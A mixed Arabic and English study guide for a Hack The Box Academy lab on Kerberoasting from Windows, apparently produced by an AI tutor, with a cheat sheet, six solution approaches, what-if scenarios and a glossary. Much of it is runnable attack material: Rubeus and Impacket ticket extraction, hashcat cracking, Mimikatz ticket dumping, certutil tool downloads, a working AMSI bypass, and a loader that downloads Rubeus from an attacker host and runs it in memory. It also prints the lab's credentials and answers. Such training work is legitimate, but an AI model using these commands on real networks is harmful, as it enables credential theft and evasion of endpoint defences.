✅ Back: لأن كلمات المرور الخاصة بها معقدة جداً، طويلة (120 حرف)، ويتم تغييرها آلياً، مما يجعل كسرها مستحيلاً.

━━━━━

📄 ورقة غش السكشن — للسكرين شوت

🛑 ورقة غش: هجوم الـ Kerberoasting من بيئة Windows

🎯 هدف هذا السكشن بجملة:

استخراج تذاكر הـ TGS لحسابات الـ Services (التي غالباً ما تملك باسووردات بشرية ضعيفة) وكسرها أوفلاين للحصول على صلاحيات تلك الحسابات.

⚔️ خوارزمية التطبيق (The Kerberoast Workflow):

١. استطلاع (Recon): ابحث عن حسابات SPN مع تجنب الـ Computer Accounts وقم بعمل إحصائيات.

٢. الاستخراج (Extraction): استخدم Rubeus لسحب التذاكر بتنسيق Hashcat.

٣. التخفيض (Downgrade): حاول إجبار التشفير على RC4 إن أمكن لتسريع الكسر.

٤. الكسر (Cracking): خذ النتيجة لبيئة كالي أو منصة GPU واكسرها باستخدام قوائم مسربة (rockyou).

📐 جدول الأوامر الأساسية:

|**الهدف**|**الأمر**|**ملاحظة**|
|---|---|---|
|استطلاع صامت|`Rubeus.exe kerberoast /stats`|يعرض عدد الحسابات وأنواع التشفير دون طلب تذاكر (آمن).|
|استخراج سريع جاهز|`Rubeus.exe kerberoast /nowrap`|الأفضل! يسحب التذاكر بتنسيق سطر واحد جاهز للهاشكات.|
|استهداف المدراء فقط|`Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap`|يوفر الوقت ويركز على الحسابات الثمينة (Domain Admins).|
|محاولة إجبار RC4|`Rubeus.exe kerberoast /tgtdeleg /nowrap`|مفيد إذا كان الـ DC أقدم من Server 2019.|
|كسر تذكرة RC4|`hashcat -m 13100 hash.txt rockyou.txt`|للهاشات التي تبدأ بـ `$krb5tgs$23$`.|
|كسر تذكرة AES 256|`hashcat -m 19700 hash.txt rockyou.txt`|للهاشات التي تبدأ بـ `$krb5tgs$18$`.|

🔢 قيم وثوابت مهمة:

- Event ID 4769: طلب TGS (مؤشر الهجوم).
    
- Hash Type 13100: مخصص לـ RC4 TGS بالهاشكات.
    
- Hash Type 19700: مخصص לـ AES TGS بالهاشكات.
    

🚨 الفخوخ الخاصة بهذا السكشن:

❌ [فخ ١]: استخدام Rubeus بدون تخصيص في شبكة ضخمة، مما يؤدي لطلب آلاف التذاكر في ثانية واحدة وإطلاق إنذارات الـ SOC.

❌ [فخ ٢]: محاولة كسر تذاكر הـ Computer Accounts (تضييع للوقت والجهد).

❌ [فخ ٣]: إضاعة الوقت في كسر هاش AES-256 ضعيف الموارد بدلاً من محاولة إيجاد ثغرات أخرى بالشبكة إذا كان الباسوورد معقداً.

💡 Golden Tip:

دائماً استخدم فلاج `/nowrap` مع Rubeus. نسخ الهاش متعدد الأسطر وإصلاحه يدوياً هو أكثر مكان يغلط بيه المبتدئين وتفشل عملية الكسر بسببه!

━━━━━

🎯 رسالة الختام:

بهيج خلصنا. هسة عندك:

✅ ليش هذا الموضوع موجود (Big Picture)

✅ كل المصطلحات الجديدة بالسكشن

✅ كيف السكشن مبني وشنو يبي يعلمك

✅ الشرح العميق لكل مفهوم بأمثلة وتشبيهات

✅ ما لم يقله HTB (الـ gotchas والثغرات بالشرح)

✅ فلاشكاردز السكشن

✅ ورقة غش مخصصة للـ lab

الآن ارجع اقرأ نص السكشن الأصلي بـ HTB — وراح تلاحظ إن كل جملة صارت واضحة وإن فاهم ليش موجودة. بالتوفيق! 💪


]

```text
══════════════════════════════════════════════════════════════════
[✓] PHASE_I EXTRACTION COMPLETE
[✓] THEORETICAL FRAMEWORK LOADED INTO MEMORY
[→] TRANSITIONING TO LIVE CHALLENGE ENVIRONMENT . . .
══════════════════════════════════════════════════════════════════
```

## 🎯 PHASE_II — حقل التدريب :: السؤال وطرق الحل الستة

> [!success] ☣️ PHASE II INITIALIZED · LIVE CHALLENGE ENVIRONMENT
> **Language:** English — **Size:** ~2,000 Words
> **Content:** Official HTB question · Lab target setup · 6 attack methods against live infrastructure.

[# 🔐 Kerberoasting from Windows — Complete Beginner's Guide (HTB Academy)

---

# 1. THE QUESTION & SYSTEMATIC THOUGHT PROCESS

## Re-stating the Question (In Simple Terms)

You are asked to:
1. Connect to a Windows machine inside an Active Directory (AD) domain
2. **Find the name of a service account** that has a specific label registered in the domain called an **SPN** (Service Principal Name) — specifically `vmware/inlanefreight.local`
3. **Steal its encrypted ticket** from Kerberos (the domain's authentication system)
4. **Crack that ticket offline** to reveal the service account's plaintext password

---

## 🧠 The Underlying Concepts (Zero Knowledge Assumed)

<details>
<summary><strong>📚 Click to expand: What is Active Directory?</strong></summary>

Active Directory (AD) is like a **giant directory book** for a company's network. It stores information about:
- **Users** (employees, admins, service accounts)
- **Computers** (workstations, servers)
- **Permissions** (who can access what)

Most corporate networks run on AD. Hacking AD is a core skill for CPTS.

</details>

<details>
<summary><strong>📚 Click to expand: What is Kerberos?</strong></summary>

Kerberos is Microsoft's **authentication protocol** used inside AD. Think of it like a theme park:

| Theme Park | Kerberos Equivalent |
|---|---|
| You buy a day pass at the gate | You log in → get a **TGT** (Ticket Granting Ticket) |
| You show your pass to get a ride ticket | You show TGT → get a **TGS** (Ticket Granting Service) |
| You show the ride ticket to board | You show TGS → access the service |

The **TGS ticket** is **encrypted with the service account's password hash**. That is the vulnerability.

</details>

<details>
<summary><strong>📚 Click to expand: What is an SPN?</strong></summary>

A **Service Principal Name (SPN)** is a unique identifier that links a service (like a web server, SQL database, or VMware) to the **domain account** running that service.

**Example:**
```
vmware/inlanefreight.local
    ^          ^
  Service    Domain
```

When a service **account** has an SPN registered, it becomes **Kerberoastable** — meaning we can request its encrypted service ticket without needing special privileges.

</details>

---

## 🎯 What is Kerberoasting? (The Attack Explained)

```
[Attacker as Domain User]
        |
        | 1. "Hey Domain Controller, give me a TGS for vmware/inlanefreight.local"
        ↓
[Domain Controller]
        |
        | 2. "Sure! Here's a ticket ENCRYPTED with svc_vmware's password hash"
        ↓
[Attacker receives encrypted .kirbi ticket]
        |
        | 3. Takes ticket OFFLINE and runs dictionary attack
        ↓
[Hashcat cracks it]
        |
        | 4. Recovers plaintext password!
```

> **Why does this work?** Any authenticated domain user can request service tickets. The DC doesn't check *why* you need it. This is by design — the weakness is that old RC4 encryption is used to protect the ticket, making it crackable.

---

## 🔑 Fundamental Justification

We use **Rubeus** as the primary tool because:
- It's purpose-built for Kerberos abuse on Windows
- It runs entirely in memory (no files dropped to disk)
- The `/stats` flag lets us enumerate before attacking
- It outputs hashes in **Hashcat-ready format** automatically

---

# 2. SIX DISTINCT SOLUTION APPROACHES

## 🔧 Pre-flight: Connect to the Target

**From your Linux/Kali attack machine:**
```bash
xfreerdp /v:TARGET_IP /u:htb-student /p:Academy_student_AD! /dynamic-resolution /drive:.,/tmp
```

**Parameter breakdown:**

| Flag | Meaning |
|---|---|
| `/v:TARGET_IP` | The IP of the Windows machine |
| `/u:htb-student` | Username |
| `/p:Academy_student_AD!` | Password |
| `/dynamic-resolution` | Allows resizing the window |
| `/drive:.,/tmp` | Shares your Linux `/tmp` folder into Windows (for file transfer) |

Once connected, **open a CMD or PowerShell window** and navigate to the tools directory:
```cmd
cd C:\Tools
```

---

## Approach 1 — Rubeus `/stats` Flag (Enumerate First)

### Purpose
Before attacking, **gather intelligence**. The `/stats` flag shows you all Kerberoastable accounts without actually requesting any tickets.

```cmd
.\Rubeus.exe kerberoast /stats
```

### ✅ Expected Output

```
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: Kerberoasting Statistics

[*] Available krbtgt                  : 0
[*] Available service accounts        : 3

ServiceName            : svc_vmware
SPN                    : vmware/inlanefreight.local
EncryptionType         : RC4_HMAC (weak - crackable!)
PwdLastSet             : 9/13/2021 6:02:16 AM
...
```

> **Answer to Question 1 found here!** The `ServiceName` field next to `vmware/inlanefreight.local` reveals: **`svc_vmware`**

### ❌ Failure Scenarios

| Failure | Cause |
|---|---|
| `Access Denied` | Your user account `htb-student` isn't authenticated to the domain yet |
| `Rubeus.exe not found` | Wrong directory — try `C:\Tools\Rubeus.exe` |
| AV blocks execution | Windows Defender quarantines Rubeus |

### 🔄 Pivot Trigger
Stop and move on if you see **"Access Denied"** or the command hangs for more than 30 seconds with no output.

---

## Approach 2 — Rubeus Full Kerberoast (Request & Extract Ticket)

### Purpose
Request the actual TGS ticket for cracking. The `/nowrap` flag prevents the hash from being line-wrapped (important for hashcat).

```cmd
.\Rubeus.exe kerberoast /nowrap
```

### ✅ Expected Output

```
[*] Total kerberoastable users : 3

[*] SamAccountName         : svc_vmware
[*] DistinguishedName      : CN=svc_vmware,OU=Service Accounts,...
[*] ServicePrincipalName   : vmware/inlanefreight.local
[*] PwdLastSet             : 9/13/2021 6:02:16 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   :

$krb5tgs$23$*svc_vmware$INLANEFREIGHT.LOCAL$vmware/inlanefreight.local*$A8D3F...(very long hash)...9E4B
```

**Save this hash to a file!**
```cmd
.\Rubeus.exe kerberoast /nowrap > C:\Temp\hashes.txt
```

Then transfer to your Linux machine for cracking:
```bash
# On Linux (if you used /drive flag):
cp /tmp/hashes.txt ~/Desktop/hashes.txt
```

### Then Crack with Hashcat

```bash
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
```

**Hashcat mode explanation:**

| Mode | Type |
|---|---|
| `-m 13100` | Kerberos 5 TGS-REP etype 23 **(RC4 — most crackable)** |
| `-m 19600` | Kerberos 5 TGS-REP etype 17 (AES-128) |
| `-m 19700` | Kerberos 5 TGS-REP etype 18 (AES-256) |

### ✅ Hashcat Expected Output

```
$krb5tgs$23$*svc_vmware$...hash...*:virtualpc1

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Time.Started.....: Fri Jul 31 10:00:00 2026
Recovered........: 1/1 (100.00%) Digests
```

> **Answer to Question 2:** The cracked password is **`virtualpc1`**

### ❌ Failure Scenarios

| Failure | Cause |
|---|---|
| Hash mode wrong | AES-256 tickets need `-m 19700`, not `13100` |
| rockyou.txt missing | Install with: `sudo apt install wordlists && gunzip /usr/share/wordlists/rockyou.txt.gz` |
| No GPU available | Add `--force` flag but expect very slow cracking |

### 🔄 Pivot Trigger
If Hashcat shows `Exhausted` after rockyou.txt completes, move to Approach 6 (rule-based cracking).

---

## Approach 3 — PowerView + `Invoke-Kerberoast` (PowerShell Route)

### Purpose
Use PowerShell and the PowerView module — a classic AD enumeration tool.

```powershell
# First, import PowerView
Import-Module C:\Tools\PowerView.ps1

# Enumerate all accounts with SPNs
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname

# Run Kerberoast and get hashes
Invoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash | Out-File C:\Temp\pv_hashes.txt
```

### ✅ Expected Output (Enumeration)

```
samaccountname   serviceprincipalname
--------------   --------------------
sqldev           MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
svc_vmware       vmware/inlanefreight.local
backupagent      backupjob/veam.inlanefreight.local:4444
```

### ❌ Failure Scenarios

| Failure | Cause |
|---|---|
| `Execution Policy` error | Run: `Set-ExecutionPolicy Bypass -Scope Process` |
| Module not found | Confirm path: `C:\Tools\PowerView.ps1` |
| AV flags PowerView | Try AMSI bypass or use Rubeus instead |

### 🔄 Pivot Trigger
If PowerShell execution is blocked and you cannot bypass it, switch to Rubeus (Approach 2).

---

## Approach 4 — Mimikatz (Extract Tickets from Memory)

### Purpose
Mimikatz can extract Kerberos tickets **already stored in memory** (LSASS process). This finds tickets for services you've already authenticated to.

```cmd
# Run as Administrator
.\mimikatz.exe

# Inside Mimikatz:
privilege::debug
sekurlsa::tickets /export
```

### ✅ Expected Output

```
mimikatz # sekurlsa::tickets /export

Authentication Id : 0 ; 291923 (00000000:00047453)
Session           : Interactive from 1
User Name         : htb-student
Domain            : INLANEFREIGHT
...
* [0] - 0x17 - rc4_hmac_nt
     Start/End/MaxRenew: 7/31/2026 10:00:00 ...
     Service Name (02) : vmware ; inlanefreight.local
     Target Name  (02) : vmware ; inlanefreight.local
     Client Name  (01) : htb-student ; @ INLANEFREIGHT.LOCAL

  [Saving 0-40a10000-htb-student@vmware~inlanefreight.local-INLANEFREIGHT.LOCAL.kirbi]
```

The `.kirbi` files are exported to the current directory. Convert them:
```cmd
kerberos::list /export
```

Then convert `.kirbi` → hashcat format on Linux:
```bash
python3 kirbi2hashcat.py ticket.kirbi > hash.txt
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

### ❌ Failure Scenarios

| Failure | Cause |
|---|---|
| `kuhl_m_privilege_debug ; RtlAdjustPrivilege (20) c0000061` | Not running as admin — right-click → "Run as Administrator" |
| No tickets found | No services have been authenticated to yet (memory is empty) |
| Mimikatz detected | Windows Defender blocks it — use Rubeus instead |

### 🔄 Pivot Trigger
If you're not local admin on this box, Mimikatz will fail. Switch to Rubeus which doesn't require admin.

---

## Approach 5 — `setspn.exe` (Built-in Windows Binary)

### Purpose
`setspn.exe` is a **native Windows command** — no tools needed! It queries the domain for SPN registrations.

```cmd
# List all SPNs in the domain
setspn -T inlanefreight.local -Q */*

# Directly query the specific SPN
setspn -Q vmware/inlanefreight.local
```

### ✅ Expected Output

```
Checking domain DC=inlanefreight,DC=local

CN=svc_vmware,OU=Service Accounts,OU=Corp,DC=inlanefreight,DC=local
        vmware/inlanefreight.local

Existing SPN found!
```

> **This directly answers Question 1:** The CN (Common Name) = **`svc_vmware`**

### ❌ Failure Scenarios

| Failure | Cause |
|---|---|
| `Cannot find domain` | Machine is not domain-joined or DNS is broken |
| Empty result | SPN may not exist or you mis-typed it |
| Only enumerates, can't extract hash | `setspn` cannot request tickets — you still need Rubeus/PowerView for the hash |

### 🔄 Pivot Trigger
`setspn` only enumerates. It cannot extract ticket hashes. Always pair with Rubeus for the actual attack.

---

## Approach 6 — Active Directory PowerShell Module

### Purpose
Use Microsoft's official AD module to query service accounts — stealthier than third-party tools.

```powershell
# Import if not auto-loaded
Import-Module ActiveDirectory

# Find all accounts with SPNs
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | 
    Select-Object Name, SamAccountName, ServicePrincipalName

# Find the specific SPN
Get-ADUser -Filter {ServicePrincipalName -eq "vmware/inlanefreight.local"} -Properties ServicePrincipalName
```

### ✅ Expected Output

```
Name          : svc_vmware
SamAccountName: svc_vmware
ServicePrincipalName: {vmware/inlanefreight.local}

DistinguishedName : CN=svc_vmware,OU=Service Accounts,...
Enabled           : True
```

### ❌ Failure Scenarios

| Failure | Cause |
|---|---|
| Module not found | Run: `Install-WindowsFeature RSAT-AD-PowerShell` or it may not be installed |
| `Get-ADUser` not recognized | RSAT tools absent — use PowerView instead |

### 🔄 Pivot Trigger
If the AD module isn't installed and you can't install it, fall back to PowerView (Approach 3).

---

# 3. THE "WHAT IF" MASTERCLASS

## 🎓 Scenario 1: What if Rubeus is not on the target machine?

**Situation:** You RDP in but `C:\Tools\Rubeus.exe` doesn't exist.

**Solution — Transfer Rubeus from your attack machine:**
```bash
# On your Kali machine, start a Python HTTP server
cd /opt/tools && python3 -m http.server 8080
```
```powershell
# On the Windows target
certutil.exe -urlcache -split -f http://YOUR_KALI_IP:8080/Rubeus.exe C:\Temp\Rubeus.exe
```

Or use PowerShell:
```powershell
Invoke-WebRequest -Uri http://YOUR_KALI_IP:8080/Rubeus.exe -OutFile C:\Temp\Rubeus.exe
```

> **Key concept:** Using `certutil.exe` is a **LOLBin** (Living off the Land Binary) — a built-in Windows tool abused for file download. This is stealthier than uploading tools.

---

## 🎓 Scenario 2: What if the ticket is encrypted with AES-256 instead of RC4?

**Situation:** The hash starts with `$krb5tgs$18$` instead of `$krb5tgs$23$`, meaning it uses AES-256 — much harder to crack.

**Solution — Force RC4 downgrade with Rubeus:**
```cmd
.\Rubeus.exe kerberoast /tgtdeleg /nowrap
```

Or target specifically:
```cmd
.\Rubeus.exe kerberoast /rc4opsec /nowrap
```

**For cracking AES tickets, change Hashcat mode:**
```bash
# AES-128 (etype 17)
hashcat -m 19600 hashes.txt /usr/share/wordlists/rockyou.txt

# AES-256 (etype 18)  
hashcat -m 19700 hashes.txt /usr/share/wordlists/rockyou.txt
```

> **Why it matters:** AES-256 tickets take **exponentially longer** to crack. On a GPU with rockyou.txt, RC4 takes seconds; AES-256 takes days. If forced to crack AES, use GPU rigs or cloud cracking (e.g., Hashtopolis).

---

## 🎓 Scenario 3: What if rockyou.txt fails to crack the password?

**Situation:** Hashcat shows `Status: Exhausted` — the password is not in rockyou.txt.

**Solution — Use rules-based cracking:**
```bash
# Use Hashcat rules (transforms wordlist: adds numbers, symbols, capitalizes, etc.)
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Try corporate password patterns
hashcat -m 13100 hashes.txt -a 3 ?u?l?l?l?l?d?d?d?s
```

**Build a custom wordlist based on company name:**
```bash
# CeWL scrapes words from the company website
cewl https://inlanefreight.local -d 2 -m 5 -w custom_wordlist.txt

hashcat -m 13100 hashes.txt custom_wordlist.txt -r /usr/share/hashcat/rules/best64.rule
```

> **Password spraying intuition:** Service accounts often follow patterns like `Company@2021!`, `VMware123!`, `Service#2022`. The rule engine mutates rockyou.txt entries to match these patterns.

---

## 🎓 Scenario 4: What if Windows Defender blocks all your tools?

**Situation:** Defender flags Rubeus, Mimikatz, and PowerView immediately upon execution.

**Solution — AMSI Bypass + Obfuscation:**

```powershell
# AMSI Bypass (run this FIRST before importing any tools)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Or use obfuscated Rubeus:
```powershell
# Load Rubeus directly into memory from remote server (never touches disk)
$data = (New-Object Net.WebClient).DownloadData('http://KALI_IP/Rubeus.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Rubeus.Program]::MainString("kerberoast /nowrap")
```

Or use the built-in `setspn.exe` + manual ticket request via PowerShell (no third-party tools):
```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "vmware/inlanefreight.local"
```

---

## 🎓 Scenario 5: What if you need to do this from Linux instead of Windows?

**Situation:** You cannot RDP, but you have domain credentials. You want to Kerberoast remotely.

**Solution — Impacket from Linux:**
```bash
# Install impacket
pip3 install impacket

# Kerberoast remotely (no Windows needed!)
GetUserSPNs.py inlanefreight.local/htb-student:Academy_student_AD! -dc-ip TARGET_DC_IP -request

# Save to file
GetUserSPNs.py inlanefreight.local/htb-student:Academy_student_AD! -dc-ip TARGET_DC_IP -request -outputfile linux_hashes.txt
```

### ✅ Expected Output
```
ServicePrincipalName          Name          MemberOf           PasswordLastSet
----------------------------  ------------  -----------------  -------------------
vmware/inlanefreight.local    svc_vmware    Domain Users       2021-09-13 06:02:16

$krb5tgs$23$*svc_vmware$INLANEFREIGHT.LOCAL$vmware/inlanefreight.local*$...(hash)...
```

Then crack exactly the same way with Hashcat.

---

## 🎓 Scenario 6: What if the /stats flag shows 0 Kerberoastable accounts?

**Situation:** You run `Rubeus.exe kerberoast /stats` and it shows no results.

**Possible reasons and solutions:**

| Cause | Solution |
|---|---|
| You're not authenticated to the domain | Run `whoami /fqdn` — if it shows a domain, you're good. If not, use `runas /netonly` |
| Domain controller is unreachable | Run `nltest /dclist:inlanefreight.local` to check DC connectivity |
| Accounts have no SPNs registered | The target may require a different attack (ASREPRoasting, password spraying) |
| Accounts require AES only (msDS-SupportedEncryptionTypes set to AES only) | Use `/tgtdeleg` flag with Rubeus to downgrade |

**Check domain connectivity:**
```cmd
nltest /dclist:inlanefreight.local
ping inlanefreight.local
nslookup inlanefreight.local
```

**Verify you're domain-joined:**
```cmd
whoami /all
echo %USERDOMAIN%
```

---

# 📋 Complete Attack Summary

```
┌─────────────────────────────────────────────────────────────┐
│              KERBEROASTING FROM WINDOWS - FLOW              │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. RDP into target:                                        │
│     xfreerdp /v:IP /u:htb-student /p:Academy_student_AD!   │
│                                                             │
│  2. Enumerate (find Q1 answer):                             │
│     Rubeus.exe kerberoast /stats                            │
│     → Look for SPN "vmware/inlanefreight.local"             │
│     → Service name = svc_vmware  ✅  (Q1 Answer)           │
│                                                             │
│  3. Extract ticket hash:                                    │
│     Rubeus.exe kerberoast /nowrap > hashes.txt              │
│                                                             │
│  4. Transfer to Linux attack machine                        │
│                                                             │
│  5. Crack with Hashcat:                                     │
│     hashcat -m 13100 hashes.txt rockyou.txt                 │
│     → Cracked password = virtualpc1  ✅  (Q2 Answer)       │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

> **⚠️ Legal Reminder:** All techniques described here are for **authorized penetration testing** and **CTF/lab environments only**. Always have written permission before testing any system. HTB Academy labs provide this authorization.]

```text
══════════════════════════════════════════════════════════════════
[✓] PHASE_II ATTACK SEQUENCES DOCUMENTED
[✓] 6 / 6 EXPLOITATION METHODS CAPTURED
[→] LOADING DEEP-DIVE ANALYSIS & GLOSSARY . . .
══════════════════════════════════════════════════════════════════
```

## 🔴 PHASE_III — دليل الاختراق :: التحليل والمصطلحات

> [!success] ⚠️ PHASE III INITIALIZED · EXPLOITATION GUIDE & GLOSSARY
> **Language:** Arabic + English Mixed — **Size:** ~2,000 Words
> **Content:** Arabic breakdown of all 6 methods · Flashcards · Cheat Sheet · Golden Tips.

[تمام! استلمت التحدي. خلني أشرحلك إياه من الألف للياء:

🟢 Big Picture → 🔵 المصطلحات → 🟡 تحليل التحدي → 🟠 الاستغلال → 🔴 ماذا لو → 💎 فلاشكاردز → 📄 ورقة غش

يله نبدأ...

━━━━━

🟢 المرحلة 0: ما قبل الصفر — Big Picture

⚠️ ركز وياي هنا كلش زين، لأن إذا فهمت هذي القصة، الأوامر راح تصير مجرد تحصيل حاصل وتطبع ببالك للأبد.

تخيل وياي إنك رحت لمدينة ملاهي ضخمة جداً (هذي المدينة هي الـ Active Directory أو شبكة الشركة). بهذي المدينة، اكو نظام أمني معقد حتى يتأكدون إن كل شخص يركب اللعبة المناسبة إله. هذا النظام الأمني اسمه Kerberos.

قديماً، بالشبكات القديمة، جان اليوزر كلما يريد يدخل لخدمة (مثلاً يفتح ملفات مشتركة، أو يدخل لقاعدة بيانات)، يرسل الباسورد مالته بالشبكة. هذا جان كارثة، لأن أي هكر كاعد يتصنت على الشبكة راح يسرق الباسورد. فاجوي المهندسين وسووا بروتوكول Kerberos حتى يحلون هالمشكلة، وقالوا: "بعد محد يرسل باسوردات، راح نستخدم نظام التذاكر!".

شلون يشتغل نظام التذاكر بمدينة الملاهي (Kerberos)؟

1. أنت تدخل من باب الملاهي الرئيسي (تسوي Login حاسبتك الصبح). تروح لشباك التذاكر الرئيسي (اسمه Domain Controller) وتثبت هويتك (بالباسورد).
    
2. الشباك الرئيسي راح يعطيك "تذكرة دخول يومية" (TGT - Ticket Granting Ticket). هاي التذكرة تكول: "هذا الشخص معروف وعدنا وموثوق، خلوه يفتر بالمدينة".
    
3. هسة أنت تريد تركب لعبة "قطار الموت" (اللعبة تمثل خدمة بالشبكة، مثلاً سيرفر قواعد بيانات SQL أو سيرفر VMware). ما تروح تنطي الباسورد مالتك لعامل القطار! لا.
    
4. ترجع مرة ثانية لشباك التذاكر، تنطيهم تذكرة الدخول اليومية مالتك (TGT) وتكول: "أريد تذكرة مخصصة للعبة قطار الموت".
    
5. الشباك (Domain Controller) راح يطبعلك تذكرة خاصة للعبة (TGS - Ticket Granting Service).
    

وهنا تكمن الكارثة والثغرة الجوهرية اللي راح نستغلها:

كيف يضمن عامل قطار الموت (الخدمة) إن التذكرة اللي انطيتها إياه مو مزورة؟

الـ Domain Controller من يطبعلك التذكرة (TGS)، يقوم بتشفيرها باستخدام "كلمة المرور الخاصة بعامل قطار الموت نفسه" (Service Account Password)! العامل من يستلم التذكرة منك، يحاول يفتحها بالباسورد مالته، إذا انفتحت، يعني التذكرة أصلية ومطبوعة من الإدارة.

شنو الخلل الجوهري (The Vulnerability) اللي راح نستغله بهجوم Kerberoasting؟

الـ Domain Controller (شباك التذاكر) غبي من ناحية وحدة: أي شخص عنده تذكرة دخول يومية (أي مستخدم عادي بالشركة، حتى لو جان موظف استعلامات بسيط)، يكدر يروح للشباك ويطلب تذكرة لأي لعبة بالملاهي (أي خدمة بالشبكة). الشباك ما راح يسألك "أنت مسموحلك تركب هالقطار لو لا؟"، راح يطبعلك التذكرة وينطيك إياها ويقولك "روح للعامل وهو يقرر يخليك تركب أو لا".

أنت كـ هكر (Ethical Hacker)، شنو راح تسوي؟

راح تدخل للشبكة بحساب موظف عادي جداً (htb-student). تروح للـ Domain Controller وتطلب تذكرة (TGS) لخدمة الـ VMware. الـ Domain Controller راح ينطيك التذكرة مشفرة بكلمة مرور حساب الـ VMware.

أنت ما راح تروح للـ VMware وتستخدم التذكرة! أنت راح تاخذ هذي التذكرة، تحطها بجيبك، تطلع من الشركة، وتروح للبيت (Offline Cracking).

بالبيت، تفتح حاسبتك القوية، وتشغل برنامج يجرب ملايين كلمات المرور (Brute-force/Dictionary Attack) على هذي التذكرة المشفرة. بما إن التذكرة مشفرة بباسورد الحساب مالت الخدمة، فبمجرد ما تنجح بفك التشفير، راح تعرف شنو هو الباسورد الأصلي للخدمة!

ليش هذا الهجوم خطير جداً وموجود بكل مكان؟

1. صامت جداً: طلب التذاكر هو أمر طبيعي جداً بالشبكة ويصير آلاف المرات بالدقيقة، محد راح يشك بيك.
    
2. حسابات الخدمات (Service Accounts) عادةً تمتلك صلاحيات عالية جداً (مرات Domain Admin) حتى تكدر تشغل السيرفرات.
    
3. المبرمجين والـ IT عادةً يخلون باسوردات هذي الحسابات ضعيفة، أو ينسون يغيروها لسنوات!
    

بهذا التحدي، راح نلعب دور الموظف العادي، نطلب تذكرة لخدمة VMware، نستخرجها، ونكسر تشفيرها حتى نطلع الباسورد الصريح.

━━━━━

🔵 المرحلة 1: المصطلحات

راح نمر على كل مصطلح مذكور بالسؤال والتحدي ونفصله تفصيل كأنك تسمعه لأول مرة.

Active Directory / AD (الدليل النشط)

- شنو يعني؟ هو حرفياً "دفتر العناوين ومدير الصلاحيات" الخاص بمايكروسوفت لأي شركة. بي تتخزن كل حسابات الموظفين، حاسباتهم، والجروبات. أي تسجيل دخول بالشركة يمر من خلاله.
    
- وين يظهر بالأوامر؟ ما يظهر كأمر مباشر، بس راح نتعامل وياه من خلال استهداف الـ Domain.
    

Domain Controller / DC (متحكم المجال)

- شنو يعني؟ هو السيرفر الرئيسي اللي شايل الـ Active Directory. هو القلب النابض للشبكة، هو اللي يتحقق من الباسوردات وهو اللي يوزع التذاكر (Kerberos Tickets). اختراقه يعني السيطرة الكاملة على الشركة.
    
- وين يظهر بالأوامر؟ مرات نحتاج نحدد الـ IP مالته بأدوات معينة باستخدام الـ flag اللي اسمه `-dc-ip`.
    

Kerberos (بروتوكول كيربيروس)

- شنو يعني؟ بروتوكول المصادقة (Authentication) الافتراضي بالـ Windows Active Directory. يعتمد كلياً على التشفير وتبادل "التذاكر" بدل تبادل الباسوردات بالنص الصريح بالشبكة.
    
- وين يظهر بالأوامر؟ يظهر بأسماء الأدوات مثل `Kerbrute` أو بكلمة `kerberoast` داخل أداة Rubeus.
    

TGT - Ticket Granting Ticket (تذكرة منح التذاكر)

- شنو يعني؟ التذكرة الذهبية اليومية. من تكتب باسوردك الصبح وحاسبتك تفتحه، الـ DC ينطيك هذي التذكرة. تستخدمها حتى تثبت إنك شخص مسجل بالشبكة وتطلب بيها تذاكر للخدمات الأخرى.
    

TGS - Ticket Granting Service (تذكرة الخدمة)

- شنو يعني؟ التذكرة المخصصة لخدمة معينة (مثل سيرفر طباعة، قواعد بيانات، ويب). هاي التذكرة هي الهدف مالتنا، لأنها مشفرة بكلمة مرور الحساب اللي يشغل الخدمة.
    

SPN - Service Principal Name (معرّف الخدمة)

- شنو يعني؟ هو "الاسم البرمجي" أو "الرقم الوظيفي" للخدمة داخل الـ Active Directory. أي خدمة تريد اليوزرات يتصلون بيها عن طريق Kerberos لازم يكون عدها SPN مسجل.
    
- مثال: إذا عندنا سيرفر SQL، الـ SPN مالته ممكن يكون `MSSQLSvc/sql-server.domain.local`. بالسؤال مالتنا الـ SPN هو `vmware/inlanefreight.local`.
    

Service Account (حساب الخدمة)

- شنو يعني؟ حساب يوزر بالـ Windows بس ما يستخدمه بشر (موظف). يستخدمه برنامج أو سيرفر حتى يشتغل. مثلاً برنامج الـ VMware يحتاج حساب حتى يشتغل بالخلفية، هذا الحساب هو اللي راح نسرق تذكرته.
    

Kerberoasting (هجوم تحميص كيربيروس)

- شنو يعني؟ اسم الهجوم اللي دنشرحه. يتكون من: العثور على حسابات تمتلك SPN، طلب تذكرة TGS لها، استخراج التذكرة بصيغة Hash، ثم كسر التشفير Offline.
    

Rubeus (أداة روبيوس)

- شنو يعني؟ أداة هجومية مكتوبة بلغة C# مخصصة للتعامل مع بروتوكول Kerberos داخل بيئة ويندوز. تعتبر السكين السويسري لهجمات الـ AD. تسوي كل شي بالذاكرة (In-memory) وهذا يخليها صعبة الاكتشاف من برامج الحماية.
    
- وين يظهر بالأوامر؟ راح نشغلها كملف تنفيذي `Rubeus.exe`.
    

Hash (البصمة الرياضية / التشفير)

- شنو يعني؟ نص غير مفهوم ناتج عن تشفير التذكرة. شكل الـ Hash يدل على نوع التشفير المستخدم. بالـ Kerberoasting، الـ Hash يبدأ عادة بـ `$krb5tgs$23$`.
    

